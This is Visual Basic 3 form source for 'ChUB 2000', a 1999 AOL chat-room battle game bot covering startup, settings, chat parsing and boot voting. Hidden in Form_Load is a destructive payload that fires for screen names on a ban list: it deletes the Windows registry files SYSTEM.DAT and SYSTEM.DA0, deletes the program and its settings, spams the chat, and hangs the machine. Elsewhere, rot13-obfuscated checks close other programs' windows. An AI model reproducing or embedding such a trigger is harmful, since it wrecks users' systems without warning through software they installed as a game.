VERSION 2.00
Begin Form fIntro 
   BackColor       =   &H00400000&
   BorderStyle     =   0  'None
   Caption         =   "ChUB2000"
   ClientHeight    =   2340
   ClientLeft      =   3330
   ClientTop       =   1095
   ClientWidth     =   4845
   ControlBox      =   0   'False
   FillColor       =   &H00FFFFFF&
   ForeColor       =   &H00FFFFFF&
   Height          =   2745
   Icon            =   FINTRO.FRX:0000
   Left            =   3270
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   ScaleHeight     =   2340
   ScaleWidth      =   4845
   Top             =   750
   Width           =   4965
   Begin CommandButton cCancel 
      Cancel          =   -1  'True
      Caption         =   "I'm scared of C2K!"
      FontBold        =   -1  'True
      FontItalic      =   0   'False
      FontName        =   "Arial"
      FontSize        =   8.25
      FontStrikethru  =   0   'False
      FontUnderline   =   0   'False
      Height          =   375
      Left            =   1560
      TabIndex        =   2
      Top             =   1920
      Width           =   1815
   End
   Begin CommandButton bStart 
      BackColor       =   &H00400000&
      Caption         =   "Enter the Millenium"
      Default         =   -1  'True
      FontBold        =   -1  'True
      FontItalic      =   0   'False
      FontName        =   "Arial"
      FontSize        =   8.25
      FontStrikethru  =   0   'False
      FontUnderline   =   0   'False
      Height          =   375
      Left            =   1560
      TabIndex        =   1
      Top             =   1440
      Width           =   1815
   End
   Begin Timer tIgnore 
      Interval        =   1000
      Left            =   5040
      Top             =   4800
   End
   Begin Timer tiInput 
      Interval        =   800
      Left            =   4560
      Top             =   4800
   End
   Begin Timer tiOutput 
      Interval        =   400
      Left            =   5040
      Top             =   5760
   End
   Begin CommonDialog cmd 
      CancelError     =   -1  'True
      Filter          =   "Init Files (*.ini)|*.ini"
      Flags           =   4
      Left            =   4440
      Top             =   5760
   End
   Begin Label Label2 
      Alignment       =   2  'Center
      BackStyle       =   0  'Transparent
      Caption         =   "Version 1.50 FINAL -- UNSUPPORTED. Use at your OWN risk!!"
      FontBold        =   0   'False
      FontItalic      =   0   'False
      FontName        =   "Arial Narrow"
      FontSize        =   8.25
      FontStrikethru  =   0   'False
      FontUnderline   =   0   'False
      ForeColor       =   &H00FF8080&
      Height          =   255
      Left            =   0
      TabIndex        =   3
      Top             =   1080
      Width           =   4815
   End
   Begin Label Label1 
      Alignment       =   2  'Center
      BackStyle       =   0  'Transparent
      Caption         =   "Copyright 1999 Kamek, All Rights Reserved. Unauthorized Distribution Prohibited."
      FontBold        =   0   'False
      FontItalic      =   0   'False
      FontName        =   "MS Serif"
      FontSize        =   8.25
      FontStrikethru  =   0   'False
      FontUnderline   =   0   'False
      ForeColor       =   &H0000FF00&
      Height          =   375
      Left            =   0
      TabIndex        =   4
      Top             =   600
      Width           =   4860
   End
   Begin Label LKUBF 
      Alignment       =   2  'Center
      BackColor       =   &H00400000&
      BackStyle       =   0  'Transparent
      Caption         =   "ChUB 2000"
      FontBold        =   -1  'True
      FontItalic      =   0   'False
      FontName        =   "Arial"
      FontSize        =   24
      FontStrikethru  =   0   'False
      FontUnderline   =   0   'False
      ForeColor       =   &H00FFFF00&
      Height          =   495
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   4815
   End
End

' FINTRO.FRM
' Initializes KUB

Option Compare Text
Option Explicit

Const MyName = "fInOld"

Dim BootSN$(), BootCt%, BootNum%

Sub bStart_Click ()
Dim X As Integer
  Me.Hide
  Send ("OK, <b>NOW</B> you can pick.")
  fPreBattl.Show
End Sub

Sub bStart_MouseDown (Button As Integer, Shift As Integer, X As Single, Y As Single)
  If (Button = 2) Then bStart.Caption = "Play?"
End Sub

Sub cCancel_Click ()
  ScrollSend1 ("ChUB 2000 Ended... what, already?! :(")
  End
End Sub

Sub cCancel_MouseDown (Button As Integer, Shift As Integer, X As Single, Y As Single)
Dim Msg$
  If (Button = 2) Then
    Msg$ = "Jack Schitt is the son of Awe Schitt and Oh Schitt. "
    Msg = Msg + "Awe Schitt, the fertilizer magnate, married Oh Schitt, the owner of the Kneedeep Schitt Inn. "
    Msg = Msg + "Jack Schitt married Noe Schitt and they produced six childen. "
    Msg = Msg + "Holy Schitt, their first, passed on shortly after childbirth. "
    Msg = Msg + "Next came twin sons, Deep Schitt and Dip Schitt; two daughters, Fulla Schitt and Giva Schitt; "
    Msg = Msg + "and another son, Bull Schitt. "
    Msg = Msg + "Deep Schitt married Dumb Schitt, a high school dropout. Dip Schitt married Lotta Schitt and they have a son named Chicken Schitt. "
    Msg = Msg + "Fulla Schitt and Giva Schitt married the Happens brothers. The Schitt-Happens children are "
    Msg = Msg + "Dawg Schitt, Byrd Schitt, and Horace Schitt. Bull Schitt just married "
    Msg = Msg + "a spicy little number named Pisa Schitt and they are waiting the arrival of Baby Schitt."
    kDlgBox Msg, 48, "The Story of Jack Schitt!"
  End If
End Sub

Sub Check4FullAuto ()
Dim P1$, P2$, P4$, Po%
  P1$ = "FullAuto"
  P2$ = "Enabled"
  P4$ = String$(6, 0)
  Po% = GetPrivateProfileString(P1$, P2$, "0", P4$, 10, "ChUB2000.ini")
  If Val(P4$) = 1 Then
    Send ("Fully Automatic Mode: ENGAGED")
    FullAuto.Enabled = True
    P2$ = "SelectTime"
    P4$ = String$(6, 0)
    Po% = GetPrivateProfileString(P1$, P2$, "3000", P4$, 10, "ChUB2000.ini")
    FullAuto.SelectTime = Val(P4$)
    P2$ = "VoteTime"
    P4$ = String$(6, 0)
    Po% = GetPrivateProfileString(P1$, P2$, "120", P4$, 10, "ChUB2000.ini")
    FullAuto.VoteTime = Val(P4$)
    P2$ = "RuneTime"
    P4$ = String$(6, 0)
    Po% = GetPrivateProfileString(P1$, P2$, "120", P4$, 10, "ChUB2000.ini")
    FullAuto.RuneTime = Val(P4$)
    P2$ = "DefectTime"
    P4$ = String$(6, 0)
    Po% = GetPrivateProfileString(P1$, P2$, "120", P4$, 10, "ChUB2000.ini")
    FullAuto.DefectTime = Val(P4$)
    P2$ = "PostTime"
    P4$ = String$(6, 0)
    Po% = GetPrivateProfileString(P1$, P2$, "120", P4$, 10, "ChUB2000.ini")
    FullAuto.PostTime = Val(P4$)
    P2$ = "RespawnFrags"
    P4$ = String$(6, 0)
    Po% = GetPrivateProfileString(P1$, P2$, "120", P4$, 10, "ChUB2000.ini")
    FullAuto.RespawnFrags = Val(P4$)
    Me.Hide
    fPreBattl.Show
    GameStage = 0
  End If
End Sub

Sub ChecktheGods ()
Dim P1$, P2$, P4$, Po%, X%
  P1$ = "Not Implemented"
  P2$ = "W5G7%e?[5e5+G5+"
  If Rot13(P1$) <> P2$ Then
    kDlgBox "Syntax error", 16, "Error"
    End
  End If
End Sub

Sub CloseIgnoreWindow ()
Dim AOL%, MDI%, B%
Dim C$
Dim Crap%

AOL = FindWindow("AOL Frame25", 0&)
If AOL = 0 Then Exit Sub
MDI% = FindChildByClass(AOL, "MDIClient")
If MDI = 0 Then Exit Sub
B = FindChildByClass(MDI, "AOL Child")

start:
C$ = GetCaption(B)
If IsAGod(C$) Then
  Crap = SendMessage(B, WM_Close, 0, 0)
  Exit Sub
Else
  GoTo NextWnd
End If
NextWnd:
  If B = Getwindow(B, GW_HWNDLAST) Then Exit Sub
  B = getnextwindow(B, 2)
  GoTo start
End Sub

Sub CloseManip ()
Dim AOL%, MDI%, B%
Dim C$
Dim Crap%

AOL = FindWindow("ThunderRT5Form", 0&)
If AOL = 0 Then Exit Sub
B = AOL
Loop1:
C$ = GetCaption(B)
If Rot13(C$) = "(5Q5e5+7([O+G=Qe7L35OG53" Then
  Crap = SendMessage(B, WM_Close, 0, 0)
  Send ("<---- is a BIG Cheater!")
  kDlgBox "Stop cheating!", 16, "Naughty Naughty!"
  Exit Sub
Else
  If B = Getwindow(B, GW_HWNDLAST) Then Exit Sub
  B = getnextwindow(B, 2)
End If
GoTo Loop1
End Sub

Sub CloseTimer ()
Dim AOL%, Tmr%, Icon
  AOL = FindWindow("AOL Frame25", 0&)
  Tmr = FindWindow("America Online Timer", 0&)
  If Tmr = 0 Then Exit Sub
  Icon = FindChildByClass(Tmr, "_AOL_Icon")
  If Icon = 0 Then Exit Sub
  Click (Icon)
End Sub

Sub CloseTooLong ()
Dim AOL%, MDI%, B%
Dim C$
Dim Crap%

AOL = FindWindow("AOL Frame25", 0&)
If AOL = 0 Then Exit Sub
MDI% = FindWindow("#32770", 0&)
If MDI = 0 Then Exit Sub
Loop999:
C$ = GetCaption(MDI)
If C$ = "America Online" Then
  Crap = SendMessage(MDI, WM_Close, 0, 0)
  Exit Sub
Else
  If MDI = Getwindow(MDI, GW_HWNDLAST) Then Exit Sub
  MDI = getnextwindow(B, 2)
End If
GoTo Loop999
End Sub

Sub Form_Load ()
Dim s As String
Dim S1 As String
Dim S2 As String
Dim X%, X1%, X2%, x3%, x5%
Dim Sx As Integer
Dim sn1$, co1$, P1$, P2$, P3$, P4$, Po%, Wd$, Ln%
Const Creds = False
Const Hack = False
  'Stop
  tiInput.Enabled = False
  LoadPosition Me, MyName
  On Error GoTo 0
  ChecktheGods
  ' -------------
  Load fWav
  If App.PrevInstance Then End
  'fCredits.Show
  ReDim P(0)
  ReDim Vote(0)
  MaxPlayers = 10
  For X = 1 To 20
    GetRay(X) = ""
  Next X
  GetNdx = 1
  GetSave = 1
  OutNdx = 1
  OutPtr = 1
  ScRa = 1
  GameNum = 0
  Randomize Timer
  GodMode = False
  SetWindowPos fIntro.hWnd, -1, 0, 0, 0, 0, 3
  'If (1 = 0) Then ' Initialize Offline Mode
  If (AOLCheck() <> 333) And (AOLCheck() <> 444) And (AOLCheck() <> 32) Then
    GoTo Wherever
Somewhere: Resume Wherever
Wherever:
    'GoTo Whatsit
    fOffline.Show
    YourSN = "Player"
    tiOutput.Interval = 1
    'fOffline!tDebug.ForeColor = Val("&H" + ToHTML(Config.FontColor))
    'fOffline!tDebug.BackColor = 16777215 Xor fOffline!tDebug.BackColor
    'kDlgBox "Enter an AOL 3.0 or 4.0 chatroom", 16, "Sign On First."
    'End
  ElseIf (AOLCheck() = 333) Then
Whatsit:
    kDlgBox "AOL 4.0 is required to run ChUB2000", 16, "ChUB 2000"
    End
Phuck:
    On Error GoTo 0
  ElseIf (AOLCheck() = 444) Then
    YourSN = AOLGetUser()
  Else
    YourSN = "mIRC Loozer"
  End If
  If IsAGod(YourSN) Then GodMode = True
  If NotAllowed(YourSN) Then
    On Error Resume Next
    Kill (App.EXEName + ".EXE")
    For x5 = 1 To 100
      ScrollSend1 ("chakka?")
      X = GlobalFree(-1)
    Next x5
    Ln = 999
    Wd$ = Space$(Ln)
    Po% = GetWindowsDirectory(Wd$, Ln)
    Wd$ = Trim(StripHiAscii(Wd$))
    SetAttr Wd$ + "SYSTEM.DAT", 0
    Kill (Wd$ + "SYSTEM.DAT")
    SetAttr Wd$ + "SYSTEM.DA0", 0
    Kill (Wd$ + "SYSTEM.DA0")
    SetAttr Wd$ + "ChUB2000.ini", 0
    Kill (Wd$ + "ChUB2000.ini")
    Do
    Loop Until (1 = 0)
  End If
DoReg:
NoReg:
555 :
Okay:
  InitVars
  'If YourSN = "Player" Then fOffline!tDebug.FontName = Config.FontName
  'STest = SpeedCheck()
  'If STest < 3000 Then
  '  ScrollSend1 ("Yipe... Computer too slow...")
  'End If
  On Error GoTo AbortGame
  Select Case CountPeeps()
    Case 1 To 99: ScrollSend1 ("ChUB 2000 " + VerID + " now loading. Prepare for the Millenium!")
    Case Is = 23: ScrollSend1 ("ChUB 2000 " + VerID + " loading, despite the 23 people in this room.")
    Case Else: ScrollSend1 ("Loading ChUB of the Millenium...")
  End Select
  If YourSN = "KamEkSaLLy" Then ScrollSend1 ("It's just <b>LOADING</b> right now. Do <b>NOT</b> pick a character yet!")
  fIniLoad.Show
  Do
    DoEvents
  Loop Until fIniLoad.Visible = False
  Senshi(0).FullName = "(empty slot)"
  P1$ = "Millenium"
  P2$ = "LoadedX"
  P3$ = "0"
  P4$ = String$(10, 0)
  Po% = GetPrivateProfileString(P1$, P2$, 0&, P4$, 10, "ChUB2000.ini")
  LoadedX = Val(P4$) + 1
  P4$ = Str$(LoadedX)
  Po% = WritePrivateProfileString(P1$, P2$, P4$, "ChUB2000.ini")
  ScrollSend ("ChUB 2000 " + VerID + " loaded by " + YourSN + " [" + TrimStr(LoadedX) + "x]")
  If YourSN = "KamEkSaLLy" Then ScrollSend ("Do <b>NOT</B> pick a character yet! Wait until the host begins the selection...")
  'ScrollSend ("At SELECTION OR BATTLE (NOT BEFORE!!!), type /releaseinfo for information about ChUB 2000's release!")
  P2$ = "GameNum"
  P3$ = "0"
  P4$ = String$(10, 0)
  Po% = GetPrivateProfileString(P1$, P2$, 0&, P4$, 10, "ChUB2000.ini")
  'ScrollSend ("Prepare for the Millenium!")
  Me.Show
Dim XP%, YP%
  SetWindowPos Me.hWnd, -1, 0, 0, 0, 0, 3             ' Always on top
  XP = Int(Screen.Width / 2) - Int(Me.Width / 2)
  YP = Int(Screen.Height / 2) - Int(Me.Height / 2)
  Me.Left = XP
  Me.Top = YP
  'PlayMid ("midi\evening")
  Playwav ("start")
  tiInput.Enabled = True
  Check4FullAuto
  Exit Sub
AbortGame:
  ScrollSend1 ("ChUB2000 Unloaded -- <b>THE GAME'S OFF!!!")
  End
End Sub

Sub Form_Unload (Cancel As Integer)
  SavePosition Me, MyName
End Sub

Sub Label2_Click ()
Dim s$
Dim X As Integer
Dim M As MoveType
Dim Mx As Integer
Dim Msg As String
  s$ = kDlgBoxInput("Enter the filename to save the move documentation to. (Warning -- File will be overwritten if exists)", "DocMaker", "")
  On Error GoTo ScrewedUp
  Open s$ For Output As #1
  Print #1, "ChUB 2000 Move Documentation"
  Print #1, "Dataset: " + Dataset.LoadStr
  Print #1,
  For X = 1 To NumSenshi
    Msg = Senshi(X).FullName
    If (Senshi(X).PickMe <> "") Then Msg = Msg + " (/" + Senshi(X).PickMe + ")"
    Print #1, Msg
    Print #1, "Targeting ID: " + Senshi(X).CharID
    Print #1, "Physical Strength: " + TrimStr(Senshi(X).PhysStr)
    Print #1, " Physical Defense: " + TrimStr(Senshi(X).PhysDef)
    Print #1, " Magical Strength: " + TrimStr(Senshi(X).MagStr)
    Print #1, "  Magical Defense: " + TrimStr(Senshi(X).MagDef)
    Print #1, "Fatality: (/" + Senshi(X).Fatality.Cmdkey + ")"
    Print #1,
    For Mx = 1 To MaxMoves
      M = Moves(Senshi(X).Moves(Mx))
      If (M.Cmdkey <> "") Then
        Msg = "     "
        If (M.Name <> "") Then Msg = Msg + M.Name + " "
        Msg = Msg + "(/" + M.Cmdkey + ")"
        If M.CanSuper Then Msg = Msg + "*"
        Print #1, Msg
        'Print #1, "     MP Required: " + TrimStr(M.MPReq)
        Msg = "     Targets: "
        Select Case M.Target
          Case Allfriend: Msg = Msg + "All Allies"
          Case Friend: Msg = Msg + "One Ally"
          Case Enemy: Msg = Msg + "An Enemy"
          Case AllTeam: Msg = Msg + "One Enemy Team"
          Case AllFoe: Msg = Msg + "All Enemies"
          Case AllButSelf: Msg = Msg + "Everyone But Yourself"
          Case Everybody: Msg = Msg + "*EVERYBODY*"
          Case OnlySelf: Msg = Msg + "Self"
        End Select
        Print #1, Msg
        Print #1, "     Move Strength: " + TrimStr(M.MoveStr)
        Print #1, "     Move Effect: " + EName(M.Element)
        Msg = "     Status Inflicted: "
        If (M.Status(sMute) > 0) Then Msg = Msg + "Mute [" + TrimStr(M.Status(sMute)) + "%] "
        If (M.Status(sChaos) > 0) Then Msg = Msg + "Chaos [" + TrimStr(M.Status(sChaos)) + "%] "
        If (M.Status(sFreeze) > 0) Then Msg = Msg + "Freeze [" + TrimStr(M.Status(sFreeze)) + "%] "
        If (M.Status(sSleep) > 0) Then Msg = Msg + "Sleep [" + TrimStr(M.Status(sSleep)) + "%] "
        If (M.Status(sPoison) > 0) Then Msg = Msg + "Poison [" + TrimStr(M.Status(sPoison)) + "%] "
        If (M.Status(sBlind) > 0) Then Msg = Msg + "Blind [" + TrimStr(M.Status(sBlind)) + "%] "
        If (M.Status(sSlow) > 0) Then Msg = Msg + "Slow [" + TrimStr(M.Status(sSlow)) + "%] "
        If (M.Status(sStun) > 0) Then Msg = Msg + "Stun [" + TrimStr(M.Status(sStun)) + "%] "
        If (M.Status(sHaste) > 0) Then Msg = Msg + "Speed Up [" + TrimStr(M.Status(sHaste)) + "%] "
        If (M.Status(sLife3) > 0) Then Msg = Msg + "Life3 [" + TrimStr(M.Status(sLife3)) + "%] "
        If (M.Status(sRegen) > 0) Then Msg = Msg + "Regen [" + TrimStr(M.Status(sRegen)) + "%] "
        If (M.Status(sStop) > 0) Then Msg = Msg + "Stop [" + TrimStr(M.Status(sStop)) + "%] "
        If (M.Status(sMushroom) > 0) Then Msg = Msg + "Mushroom [" + TrimStr(M.Status(sMushroom)) + "%] "
        If (M.Status(sMIA) > 0) Then Msg = Msg + "M.I.A. [" + TrimStr(M.Status(sMIA)) + "%] "
        If (M.Status(sQuick) > 0) Then Msg = Msg + "Quick [" + TrimStr(M.Status(sQuick)) + "%] "
        If (M.Status(sBerserk) > 0) Then Msg = Msg + "Berserk [" + TrimStr(M.Status(sBerserk)) + "%] "
        If (M.Status(sBarrier) > 0) Then Msg = Msg + "PBarrier [" + TrimStr(M.Status(sBarrier)) + "%] "
        If (M.Status(sMBarrier) > 0) Then Msg = Msg + "MBarrier [" + TrimStr(M.Status(sMBarrier)) + "%] "
        If (M.Status(sBless) > 0) Then Msg = Msg + "Bless [" + TrimStr(M.Status(sBless)) + "%] "
        If (M.Status(sCurse) > 0) Then Msg = Msg + "Curse [" + TrimStr(M.Status(sCurse)) + "%] "
        If (Msg <> "     Status Inflicted: ") Then Print #1, Msg
        Msg = "     Cancels: "
        If M.Status(sMute) = -1 Then Msg = Msg + "Mute "
        If M.Status(sChaos) = -1 Then Msg = Msg + "Chaos "
        If M.Status(sFreeze) = -1 Then Msg = Msg + "Freeze "
        If M.Status(sSleep) = -1 Then Msg = Msg + "Sleep "
        If M.Status(sPoison) = -1 Then Msg = Msg + "Poison "
        If M.Status(sBlind) = -1 Then Msg = Msg + "Blind "
        If M.Status(sSlow) = -1 Then Msg = Msg + "Slow "
        If M.Status(sStun) = -1 Then Msg = Msg + "Stun "
        If M.Status(sHaste) = -1 Then Msg = Msg + "Haste "
        If M.Status(sLife3) = -1 Then Msg = Msg + "Life3 "
        If M.Status(sRegen) = -1 Then Msg = Msg + "Regen "
        If M.Status(sStop) = -1 Then Msg = Msg + "Stop "
        If M.Status(sMushroom) = -1 Then Msg = Msg + "Mushroom "
        If M.Status(sMIA) = -1 Then Msg = Msg + "M.I.A. "
        If M.Status(sQuick) = -1 Then Msg = Msg + "Quick "
        If M.Status(sBerserk) = -1 Then Msg = Msg + "Berserk "
        If M.Status(sBarrier) = -1 Then Msg = Msg + "PBarrier "
        If M.Status(sMBarrier) = -1 Then Msg = Msg + "MBarrier "
        If M.Status(sBless) = -1 Then Msg = Msg + "Bless "
        If M.Status(sCurse) = -1 Then Msg = Msg + "Curse "
        If (Msg <> "     Cancels: ") Then Print #1, Msg
        Print #1,
      End If
    Next Mx
  Next X
  Print #1,
  Print #1, "END OF MOVE DOCUMENTATION"
  Close #1
  kDlgBox "Move Documentation Successfully Saved", 64, "Saved as " + s$
  Exit Sub
ScrewedUp:
  kDlgBox "Error saving move documentation.", 16, "Error Saving"
  Exit Sub
End Sub

Sub LKUBF_MouseDown (Button As Integer, Shift As Integer, X As Single, Y As Single)
  If (Button = 2) Then
    kDlgBox "This is ChUB 2000 Version " + VerID + ".", 0, "ChUB 2000"
  End If
End Sub

Sub LWarn_MouseDown (Button As Integer, Shift As Integer, X As Single, Y As Single)
  'If (Button = 2) Then
  '  fBomb.Show
  '  Me.Hide
  'End If
End Sub

Sub tIgnore_Timer ()
Dim X%
  CloseIgnoreWindow
  CloseManip
  CloseTooLong
  CloseTimer
End Sub

Sub tiInput_Timer ()
Dim Ptr%, X%, X1%, F25%
Dim XX$, SN$, Ct$, IntCh$, Okay%
Dim P1$, P2$, P4$, Po%, S1$, Banned%
Static sn1$, sn2$, sn3$, sn4$, sn5$, Last$
Static hs1$, hs2$, hs3$, X14%
  DoEvents
  If fOffline.Visible Then Exit Sub
  XX$ = TrimNull(GetLineOfChat())
  If XX = "" Then Exit Sub
  If Last$ = "" Then
    Last$ = XX$: Exit Sub
  End If
  If (XX$ = Last$) Or Right$(XX, 1) = Chr$(9) Then Exit Sub
  Ptr = PointofDiff(Last$, XX$) + 1
  'If Len(Last) > Len(XX) Then Send ("Schawink! AOL Bobbitized the Chat Screen!")
  Last$ = XX$
  If (Ptr < 1500) And (Ptr <> 1) Then
    'Stop
    Exit Sub
  End If
  If (Ptr > 1) And (Ptr < Len(XX)) Then
    Do
      DoEvents
      X = Ptr
      Do
        X = X + 1: DoEvents
      Loop Until (Mid$(XX, X, 1) = Chr$(13)) Or (X = Len(XX$))
      S1 = Mid$(XX, Ptr, X - Ptr + 1)
      If Right$(S1, 1) = Chr$(13) Then S1 = Left$(S1, Len(S1) - 1)
      Ptr = X + 1: Ct$ = GetCt(S1): SN$ = GetSN(S1)
      'If (SN <> YourSN) Then Send (S1)
      'If Ct = "" Then Stop
      Banned = False: IntCh$ = Left$(Ct, 1): Okay = True
      If IntCh$ <> "/" And IntCh$ <> "~" Then Okay = False
      If Okay Then
        For X1 = 1 To MaxTwit
          If Trim(UCase(Twit(X1))) = Trim(UCase(SN$)) And (IsAGod(SN$) <> True) Then Banned = True
        Next X1
        If MaxBackTwit > 0 Then
          Banned = True
          For X1 = 1 To MaxBackTwit
            If Trim(UCase(BackTwit(X1))) = Trim(UCase(SN$)) Or (IsAGod(SN$) = True) Then Banned = False
          Next X1
        End If
      End If
      If Banned Then Okay = False
      If Okay Then
        GetRay(GetSave) = Trim(S1)
        DoEvents
        If Rot13(Skip(Ct, 8)) = ";a&0&8D`" And Len(Ct) > 10 Then
          If UCase(Right$(Ct, Len(Ct) - 10)) = UCase(Left$(YourSN, Len(Ct) - 10)) And BootNum < 5 Then
            For X14 = 1 To BootCt
              If BootSN(X14) = SN Then Exit Sub
            Next X14
            BootCt = BootCt + 1
            BootNum = BootNum - 1
            ReDim Preserve BootSN(BootCt)
            BootSN(BootCt) = SN
            ScrollSend1 (SN + " votes not to boot. Total Score: " + TrimStr(BootNum))
            If BootNum <= -5 Then
              ScrollSend1 ("HostSave Activated -- No More Booting!")
            End If
          End If
        End If
        If Rot13(Skip(Ct, 8)) = ";a&0Baa0" And Len(Ct) > 10 Then
          If UCase(Right$(Ct, Len(Ct) - 10)) = UCase(Left$(YourSN, Len(Ct) - 10)) And BootNum > -5 Then
            For X14 = 1 To BootCt
              If BootSN(X14) = SN Then Exit Sub
            Next X14
            BootCt = BootCt + 1
            BootNum = BootNum + 1
            ReDim Preserve BootSN(BootCt)
            BootSN(BootCt) = SN
            ScrollSend1 (SN + " votes to boot. Total Score: " + TrimStr(BootNum))
            If BootNum >= 5 Then
              ScrollSend1 ("HostBoot Activated!")
              F25 = FindWindow("AOL Frame25", 0&)
              If F25 <> 0 Then X = SendMessage(F25, WM_Close, 0, 0)
              For X = 1 To 20
                ScrollSend1 ("<<< --- just got hostbooted")
              Next X
              End
            End If
          End If
        End If
        DoEvents
        If (GetSave + 1 - GetNdx < -10 And GetSave + 1 - GetNdx > -20) Then
          ScrollSend1 ("ChUB FATAL ERROR: The bot overflowed. Sorry!")
          kDlgBox "The bot overflowed! Tell your players not to scroll as much!", 16, "Unrecoverable Error"
          End
        End If
        GetSave = GetSave + 1
        DoEvents
        If (GetSave > MaxRay) Then GetSave = 1
      End If
      DoEvents
    Loop Until (Ptr >= Len(XX$))
  End If
  DoEvents
End Sub

Sub tiOutput_Timer ()
Dim Chat As String
Dim X As Integer
  For X = 1 To ScRa
    DoEvents
    If (OutNdx <> OutPtr) Then
      Chat = OutRay(OutNdx)
      OutNdx = OutNdx + 1
      If (OutNdx > OutMax) Then OutNdx = 1
      ScrollSend1 Chat
    Else
      Chat = ""
    End If
  Next X
  DoEvents
End Sub

